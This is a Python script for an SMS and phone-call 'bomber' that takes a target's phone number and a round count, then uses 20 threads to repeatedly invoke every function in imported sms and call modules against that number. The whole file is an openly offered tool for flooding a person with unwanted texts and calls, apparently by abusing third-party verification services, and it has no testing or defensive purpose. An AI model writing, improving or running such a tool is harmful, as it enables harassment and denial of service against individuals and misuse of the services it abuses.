import argparse
from concurrent.futures import ThreadPoolExecutor
from inspect import getmembers, isfunction
from Api import sms, call
from colorama import Fore, init

init(autoreset=True)  # Initialize colorama for auto-resetting colors

def get_service_functions(module):
    """Retrieve a list of callable service functions from a module."""
    return [func for func, _ in getmembers(module, isfunction)]

def execute_service(service_func, phone):
    """Wrapper to execute a service function with error handling."""
    try:
        service_func(phone)
    except Exception as e:
        print(f"{Fore.RED}Error calling {service_func.__name__}: {e}")

def bombing(phone, count, sms_services, call_services):
    phone = phone[1:]  # Ensure phone number is in the correct format
    with ThreadPoolExecutor(max_workers=20) as executor:
        for round_number in range(count):
            # Schedule SMS services
            for sms_service in sms_services:
                executor.submit(execute_service, sms_service, phone)
            # Schedule call services every 5 rounds
            if round_number != 0 and round_number % 5 == 0:
                call_service = call_services[round_number // 5 % len(call_services)]
                executor.submit(execute_service, call_service, phone)

def main():
    parser = argparse.ArgumentParser(description="This is tool for try to Echo")
    parser.add_argument("-n", "--number", type=str, required=True, help="The phone number to target, with 09123456789 prefix.")
    parser.add_argument("-c", "--count", type=int, required=True, help="The number of rounds for bombing.")
    
    args = parser.parse_args()

    sms_services = get_service_functions(sms)
    call_services = get_service_functions(call)

    bombing(phone=args.number, count=args.count, sms_services=sms_services, call_services=call_services)
    print(f"{Fore.YELLOW}Bombing completed.")

if __name__ == "__main__":
    main()
